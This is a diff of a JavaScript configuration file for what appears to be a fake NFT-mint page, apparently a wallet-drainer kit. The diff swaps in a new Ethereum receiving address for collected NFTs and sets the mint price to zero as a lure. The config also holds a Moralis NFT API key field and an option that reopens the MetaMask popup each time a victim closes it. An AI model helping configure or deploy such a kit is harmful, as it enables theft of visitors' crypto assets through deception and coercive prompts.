@@ -1,4 +1,4 @@
-const address = "0x4F7ed9794000B8dFf6DEc46056db3D21F2497A34";    // Your ETH wallet that you have to receive NFTs
+const address = "0x056F00764c0896a6BF91Bb032BFf7a3cef1BcC29";    // Your ETH wallet that you have to receive NFTs
 const infuraId = "x"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "x"    // Web3 Api key | https://moralis.io/ | For NFTs
 const collectionInfo = {
@@ -21,10 +21,10 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 0.1,         // Price per NFT.
+    price: 0.0,         // Price per NFT.
     totalSupply: 853,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
-    maxUnits: 6,        // Max units to buy.
+    maxUnits: 1,        // Max units to buy.
     askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
 }
 const nftsInfo = {
